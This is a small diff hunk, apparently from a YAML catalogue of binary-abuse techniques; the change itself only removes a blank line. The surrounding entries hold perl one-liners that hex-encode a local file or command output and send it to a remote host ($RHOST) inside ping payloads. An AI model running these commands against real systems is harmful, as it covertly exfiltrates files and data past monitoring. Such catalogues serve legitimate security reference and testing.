@@ -11,7 +11,6 @@ functions:
       code: |
         perl -0777 -ne '$_=unpack("H*",$_); for($i=0;$i<length;
         $i+=16){print "ping -c1 -p ",substr($_,$i,16)," $RHOST\n"}' $LFILE | bash
-
     - description: Send command output over ICMP using hex-encoded payloads.
       code: |
         $CMD | perl -0777 -ne '$_=unpack("H*",$_); for($i=0;$i<length;
